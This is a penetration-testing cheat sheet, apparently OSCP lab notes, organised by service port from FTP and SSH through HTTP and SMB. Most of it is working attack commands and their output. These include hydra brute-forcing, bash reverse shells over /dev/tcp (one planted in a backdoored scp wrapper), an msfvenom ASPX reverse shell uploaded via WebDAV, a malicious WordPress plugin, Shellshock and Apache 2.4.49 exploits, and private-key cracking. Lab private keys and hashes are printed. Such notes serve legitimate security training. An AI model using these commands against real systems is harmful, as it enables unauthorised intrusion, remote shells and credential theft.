## Example Cheat Sheet <img src="https://media.giphy.com/media/M9gbBd9nbDrOTu1Mqx/giphy.gif" width="100"/>
## If anything is missing refer here
````
https://github.com/0xsyr0/oscp
````
## Service Enumeration <img src="https://cdn-icons-png.flaticon.com/512/6989/6989458.png" width="40" height="40" />
### Network Enumeration
````
ping $ip #63 ttl = linux #127 ttl = windows
````
````
nmap -p- --min-rate 1000 $ip
nmap -p- --min-rate 1000 $ip -Pn #disables the ping command and only scans ports
````
````
nmap -p <ports> -sV -sC -A $ip
````
### Stealth Scan
````
nmap -sS -p- --min-rate=1000 10.11.1.229 -Pn #stealth scans
````
### Rust Scan
````
target/release/rustscan -a 10.11.1.252
````
### UDP Scan
````
sudo nmap -F -sU -sV $ip
````
### Script to automate Network Enumeration
````
#!/bin/bash

target="$1"
ports=$(nmap -p- --min-rate 1000 "$target" | grep "^ *[0-9]" | grep "open" | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')

echo "Running second nmap scan with open ports: $ports"

nmap -p "$ports" -sC -sV -A "$target"
````
### Autorecon
````
autorecon 192.168.238.156 --nmap-append="--min-rate=2500" --exclude-tags="top-100-udp-ports" --dirbuster.threads=30 -vv
````
### Port Enumeration
#### FTP port 21
##### Emumeration
````
ftp -A $ip
ftp $ip
anonymous:anonymous
put test.txt #check if it is reflected in a http port
````
###### Upload binaries
````
ftp> binary
200 Type set to I.
ftp> put winPEASx86.exe
````
##### Brute Force
````
hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.68 -t 4 ftp
hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
````
##### Downloading files recursively
````
wget -r ftp://steph:billabong@10.1.1.68/
wget -r ftp://anonymous:anonymous@192.168.204.157/
````
````
find / -name Settings.*  2>/dev/null #looking through the files
````
##### Exiftool
````
ls
BROCHURE-TEMPLATE.pdf  CALENDAR-TEMPLATE.pdf  FUNCTION-TEMPLATE.pdf  NEWSLETTER-TEMPLATE.pdf  REPORT-TEMPLATE.pdf
````
````
exiftool *                                             

======== FUNCTION-TEMPLATE.pdf
ExifTool Version Number         : 12.57
File Name                       : FUNCTION-TEMPLATE.pdf
Directory                       : .
File Size                       : 337 kB
File Modification Date/Time     : 2022:11:02 00:00:00-04:00
File Access Date/Time           : 2023:05:28 22:42:28-04:00
File Inode Change Date/Time     : 2023:05:28 22:40:43-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Cassie
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:38:02+02:00
Modify Date                     : 2022:11:02 11:38:02+02:00
Producer                        : Microsoft® Word 2016
======== NEWSLETTER-TEMPLATE.pdf
ExifTool Version Number         : 12.57
File Name                       : NEWSLETTER-TEMPLATE.pdf
Directory                       : .
File Size                       : 739 kB
File Modification Date/Time     : 2022:11:02 00:00:00-04:00
File Access Date/Time           : 2023:05:28 22:42:37-04:00
File Inode Change Date/Time     : 2023:05:28 22:40:44-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 2
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Mark
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:11:56+02:00
Modify Date                     : 2022:11:02 11:11:56+02:00
Producer                        : Microsoft® Word 2016
======== REPORT-TEMPLATE.pdf
ExifTool Version Number         : 12.57
File Name                       : REPORT-TEMPLATE.pdf
Directory                       : .
File Size                       : 889 kB
File Modification Date/Time     : 2022:11:02 00:00:00-04:00
File Access Date/Time           : 2023:05:28 22:42:49-04:00
File Inode Change Date/Time     : 2023:05:28 22:40:45-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 2
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Robert
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:08:26+02:00
Modify Date                     : 2022:11:02 11:08:26+02:00
Producer                        : Microsoft® Word 2016
    5 image files read
````

#### SSH port 22
##### putty tools
````
sudo apt upgrade && sudo apt install putty-tools
````
##### puttygen 
````
cat keeper.txt          
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0

````

````
puttygen keeper.txt -O private-openssh -o id_rsa
````
````
chmod 600 id_rsa
````
````
ssh root@10.10.11.227 -i id_rsa
````

##### Emumeration
##### Exploitation
````
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa USERB@10.11.1.141 -t 'bash -i >& /dev/tcp/192.168.119.140/443 0>&1'

nc -nvlp 443
````
###### no matching key exchange method found.
````
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1\
 -oHostKeyAlgorithms=+ssh-rsa\
 -oCiphers=+aes256-cbc\
 admin@10.11.1.252 -p 22000
````
##### Brute Force
````
hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 4 ssh
hydra -L users.txt -p WallAskCharacter305 192.168.153.139 -t 4 ssh -s 42022
````
##### Private key obtained
````
chmod 600 id_rsa
ssh userb@172.16.138.14 -i id_rsa
````
##### Public key obtained
````
cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8J1/BFjH/Oet/zx+bKUUop1IuGd93QKio7Dt7Xl/J91c2EvGkYDKL5xGbfQRxsT9IePkVINONXQHmzARaNS5lE+SoAfFAnCPnRJ+KrnJdPxYf4OQEiAxHwRJHvbYaxEEuye7GKP6V0MdSvDtqKsFk0YRFVdPKuforL/8SYtSfqYUywUJ/ceiZL/2ffGGBJ/trQJ2bBL4QcOg05ZxrEoiTJ09+Sw3fKrnhNa5/NzYSib+0llLtlGbagBh3F9n10yqqLlpgTjDp5PKenncFiKl1llJlQGcGhLXxeoTI59brTjssp8J+z6A48h699CexyGe02GZfKLLLE+wKn/4luY0Ve8tnGllEdNFfGFVm7WyTmAO2vtXMmUbPaavDWE9cJ/WFXovDKtNCJxpyYVPy2f7aHYR37arLL6aEemZdqzDwl67Pu5y793FLd41qWHG6a4XD05RHAD0ivsJDkypI8gMtr3TOmxYVbPmq9ecPFmSXxVEK8oO3qu2pxa/e4izXBFc= USERZ@example #new user found
````
##### Cracking Private Key
````
ssh2john id_ecdsa > id_ecdsa.hash

cat id_ecdsa.hash 
id_ecdsa:$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e697374703235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774b0d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0ddf7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00e0801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183

john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.hash

fireball         (id_ecdsa)
````
##### Finding Private keys
````
/etc/ssh/*pub #Use this to view the type of key you have aka (ecdsa)

ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@example01
````
````
/home/userE/.ssh/id_ecdsa.pub #public key
/home/userE/.ssh/id_ecdsa #private key
````
##### Errors
this means no password! Use it to login as a user on the box
````
ssh2john id_rsa > id_rsa.hash             
id_rsa has no password!
````
This means you are most likely using the private key for the wrong user, try doing a cat /etc/passwd in order to find other users to try it on. This error came from me trying a private key on the wrong user and private key which has no password asking for a password
````
ssh root@192.168.214.125 -p43022 -i id_rsa  
Warning: Identity file id_rsa not accessible: No such file or directory.
The authenticity of host '[192.168.214.125]:43022 ([192.168.214.125]:43022)' can't be established.
ED25519 key fingerprint is SHA256:rNaauuAfZyAq+Dhu+VTKM8BGGiU6QTQDleMX0uANTV4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.214.125]:43022' (ED25519) to the list of known hosts.
root@192.168.214.125's password: 
Permission denied, please try again.
root@192.168.214.125's password: 
Permission denied, please try again.
root@192.168.214.125's password: 
root@192.168.214.125: Permission denied (publickey,password).

````
##### Downloading files
````
scp -r -i id_rsa USERZ@192.168.214.149:/path/to/file/you/want .
````
##### RCE with scp
````
kali@kali:~/home/userA$ cat scp_wrapper.sh 
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
````
````
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    bash -i >& /dev/tcp/192.168.18.11/443 0>&1
    ;;
esac
````
````
scp -i .ssh/id_rsa scp_wrapper.sh userA@192.168.120.29:/home/userA/
````
````
kali@kali:~$ sudo nc -nlvp 443
````
````
kali@kali:~/home/userA$ ssh -i .ssh/id_rsa userA@192.168.120.29
PTY allocation request failed on channel 0
ACCESS DENIED.
````
````
connect to [192.168.118.11] from (UNKNOWN) [192.168.120.29] 48666
bash: cannot set terminal process group (932): Inappropriate ioctl for device
bash: no job control in this shell
userA@sorcerer:~$ id
id
uid=1003(userA) gid=1003(userA) groups=1003(userA)
userA@sorcerer:~$
````
#### Telnet port 23
##### Login
````
telnet -l jess 10.2.2.23
````
#### SMTP port 25
````
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25
````
````
nc -nv $ip 25
telnet $ip 25
EHLO ALL
VRFY <USER>
````
##### Exploits Found
SMTP PostFix Shellshock
````
https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
python2 shellshock.py 10.11.1.231 useradm@mail.local 192.168.119.168 139 root@mail.local #VRFY both useradm and root exist
````
#### DNS port 53
````
dnsrecon -d heist.example -n 192.168.54.165 -t axfr
````
#### HTTP(S) port 80,443
##### FingerPrinting
````
whatweb -a 3 $ip
nikto -ask=no -h http://$ip 2>&1
````
##### Directory Busting
##### Dirb
````
dirb http://target.com
````
##### ffuf
````
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$ip/FUZZ
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$ip/FUZZ
````
###### gobuster
````
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php,html,htm
````
###### feroxbuster
````
feroxbuster -u http://<$ip> -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 

feroxbuster -u http://192.168.138.249:8000/cms/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404 #if we dont want to see any denied

feroxbuster -u http://192.168.138.249:8000/cms/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404,302 #if website redirects
````
##### api
````
curl http://$ip/api/
````
````
[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}] 
````
````
curl http://$ip/api/user/ 
````
````
[{"login":"UserA","password":"test12","firstname":"UserA","lastname":"UserA","description":"Owner","id":10},{"login":"UserB","password":"test13","firstname":"UserB","lastname":"UserB","description":"Owner","id":30},{"login":"UserC","password":"test14","firstname":"UserC","lastname":"UserC","description":"Owner","id":6o},{"login":"UserD","password":"test15","firstname":"UserD","lastname":"UserD","description":"Owner","id":7o},{"login":"UserE","password":"test16","firstname":"UserE","lastname":"UserE","description":"Owner","id":100}]
````
##### Files of interest
````
Configuration files such as .ini, .config, and .conf files.
Application source code files such as .php, .aspx, .jsp, and .py files.
Log files such as .log, .txt, and .xml files.
Backup files such as .bak, .zip, and .tar.gz files.
Database files such as .mdb, .sqlite, .db, and .sql files.
````
##### java/apk files
````
jadx-gui
````
````
APK stands for Android Package Kit. It is the file format used by the Android operating system to distribute and install applications. An APK file contains all the necessary components and resources of an Android application, such as code, assets, libraries, and manifest files.
````
##### Brute Forcing / Fuzzing logins techniques
###### ffuf
````
ffuf -c -request request.txt -request-proto http -mode clusterbomb -fw 1 -w /usr/share/wordlists/rockyou.txt:FUZZ
````
````
POST /index.php HTTP/1.1

Host: 10.11.1.252:8000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 42

Origin: http://10.11.1.252:8000

Connection: close

Referer: http://10.11.1.252:8000/login.php

Cookie: PHPSESSID=89i7fj326pnqqarv9c03dpcuu2

Upgrade-Insecure-Requests: 1



username=admin&password=FUZZ&submit=Log+In
````
````
[Status: 302, Size: 63, Words: 10, Lines: 1, Duration: 165ms]
    * FUZZ: asdfghjkl;'

[Status: 302, Size: 63, Words: 10, Lines: 1, Duration: 172ms]
    * FUZZ: asdfghjkl;\\'
````
````
https://cybersecnerds.com/ffuf-everything-you-need-to-know/
````
##### WebDav
###### Hacktricks
````
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav
````
###### nmap results
````
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
````
###### Exploitation w/creds
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=80 -f aspx -o shell.aspx
````
````
curl -T 'shell.aspx' 'http://$VictimIP/' -u $user:<password>
````
````
http://$VictimIP/shell.aspx

nc -nlvp 80  
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.153.122] 49997
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
service\defaultservice
````
##### CMS 
###### WP Scan
````
wpscan --url http://$ip/wp/
````
###### WP Brute Forcing
````
wpscan --url http://$ip/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
````
###### simple-file-list
````
[+] simple-file-list
 | Location: http://192.168.192.105/wp-content/plugins/simple-file-list/
 | Last Updated: 2023-05-17T17:12:00.000Z
 | [!] The version is out of date, the latest version is 6.1.7
````
````
https://www.exploit-db.com/exploits/48979

Simple File List < 4.2.3 - Unauthenticated Arbitrary File Upload
````
###### Malicous Plugins
````
https://github.com/wetw0rk/malicious-wordpress-plugin
python3 wordpwn.py 192.168.119.140 443 Y

meterpreter > shell
Process 1098 created.
Channel 0 created.
python3 -c 'import pty;pty.spawn("/bin/bash")'
````
###### Drupal scan
````
droopescan scan drupal -u http://10.11.1.50:80
````
###### .git
````
sudo wget -r http://192.168.192.144/.git/ #dirb showed a .git folder
````
````
cd 192.168.192.144 #Move into the .git directory localy
````
````
sudo git show #Run a git show command in order to expose more information as below.                                                             
commit 213092183092183092138 (HEAD -> main)
Author: Stuart <luke@example.com>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

diff --git a/configuration/database.php b/configuration/database.php
index 55b1645..8ad08b0 100644
--- a/configuration/database.php
+++ b/configuration/database.php
@@ -2,8 +2,9 @@
 class Database{
     private $host = "localhost";
     private $db_name = "staff";
-    private $username = "stuart@example.lab";
-    private $password = "password123";
+    private $username = "";
+    private $password = "";
+// Cleartext creds cannot be added to public repos!
     public $conn;
     public function getConnection() {
         $this->conn = null;
````
##### API
````
http://192.168.214.150:8080/search
{"query":"*","result":""}
````
````
curl -X GET "http://192.168.214.150:8080/search?query=*"
{"query":"*","result":""}

curl -X GET "http://192.168.214.150:8080/search?query=lol"
{"query":"lol","result":""}
````
##### Exploitation CVEs
````
CVE-2014-6287 https://www.exploit-db.com/exploits/49584 #HFS (HTTP File Server) 2.3.x - Remote Command Execution
````
````
CVE-2015-6518 https://www.exploit-db.com/exploits/24044 phpliteadmin <= 1.9.3 Remote PHP Code Injection Vulnerability
````
````
CVE-XXXX-XXXX https://www.exploit-db.com/exploits/25971 Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
````
````
CVE-2009-4623 https://www.exploit-db.com/exploits/9623  Advanced comment system1.0  Remote File Inclusion Vulnerability
https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py
````
````
CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System 1.0 - SQL Injection
````
##### Exploitation http versions
````
80/tcp   open  http     Apache httpd 2.4.49
````
![image](https://user-images.githubusercontent.com/127046919/235009511-9135cd2a-06b7-4a15-9ad4-378fb0e797a1.png)

###### POC
````
./50383.sh targets.txt /etc/ssh/*pub
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@example01

./50383.sh targets.txt /home/userE/.ssh/id_ecdsa
192.168.138.245:8000
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
-----END OPENSSH PRIVATE KEY-----
````
##### ? notes
##### /etc/hosts FQDN
###### Background
````
on our initial scan we were able to find a pdf file that included credentials and instructions to setup an umbraco cms. "IIS is configured to only allow access to Umbraco the server is FQDN at the moment e.g. example02.example.com, not just example02"
````
###### Initial Scan
````
nmap -p 80,443,5985,14080,47001 -sC -sV -A 192.168.138.247                                                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 18:58 EDT
Nmap scan report for example02.example.com (192.168.138.247)
Host is up (0.067s latency).

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: example - New Hire Information
443/tcp   open  ssl/http Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: example - New Hire Information
5985/tcp  open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14080/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
47001/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unexampleble because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|10|2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2016 (89%), Microsoft Windows 10 (86%), Microsoft Windows 10 1607 (86%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   51.93 ms 192.168.119.1
2   51.88 ms example02.example.com (192.168.138.247)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.34 seconds
````
###### cat /etc/hosts
````
127.0.0.1       localhost
127.0.1.1       kali
192.168.138.247 example02.example.com
````
###### New Nmap Scan
````
nmap -p 80,443,5985,14080,47001 -sC -sV -A example02.example.com
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 19:00 EDT
Nmap scan report for example02.example.com (192.168.138.247)
Host is up (0.092s latency).

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: example - New Hire Information
443/tcp   open  ssl/http Apache httpd 2.4.54 (OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-title: example - New Hire Information
5985/tcp  open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14080/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-trane-info: Problem with XML parsing of /evox/about
47001/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|10|2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2016 (89%), Microsoft Windows 10 (85%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   100.83 ms 192.168.119.1
2   100.82 ms example02.example.com (192.168.138.247)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.21 seconds
`````
![image](https://user-images.githubusercontent.com/127046919/234426419-f8aa53ae-f5f7-4815-92d5-99dfde8ba5fb.png)


#### POP3 port 110
##### Enumerate
In this situation we used another service on port 4555 and reset the password of ryuu to test in order to login into pop3 and grab credentials for ssh. SSH later triggered an exploit which caught us a restricted shell as user ryuu
````
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 $ip
````
````
telnet $ip 110 #Connect to pop3
USER ryuu #Login as user
PASS test #Authorize as user
list #List every message
retr 1 #retrieve the first email
````
#### RPC port 111
##### Enumerate
````
nmap -sV -p 111 --script=rpcinfo $ip
````
#### MSRPC port 135,593
##### Enumeration
````
rpcdump.py 10.1.1.68 -p 135
````
#### SMB port 139,445
Port 139
NetBIOS stands for Network Basic Input Output System. It is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network. Software applications that run on a NetBIOS network locate and identify each other via their NetBIOS names. A NetBIOS name is up to 16 characters long and usually, separate from the computer name. Two applications start a NetBIOS session when one (the client) sends a command to “call” another client (the server) over TCP Port 139. (extracted from here)

Port 445
While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.
##### Enumeration
###### nmap
````
nmap --script smb-enum-shares.nse -p445 $ip
nmap –script smb-enum-users.nse -p445 $ip
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 $ip
nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 $ip
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $ip
````
###### OS Discovery
````
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery $ip
````
smbmap
````
smbmap -H $ip
smbmap -u "user" -p "pass" -H $ip
smbmap -H $ip -u null
smbmap -H $ip -P 139 2>&1
smbmap -H $ip -P 445 2>&1
smbmap -u null -p "" -H $ip -P 139 -x "ipconfig /all" 2>&1
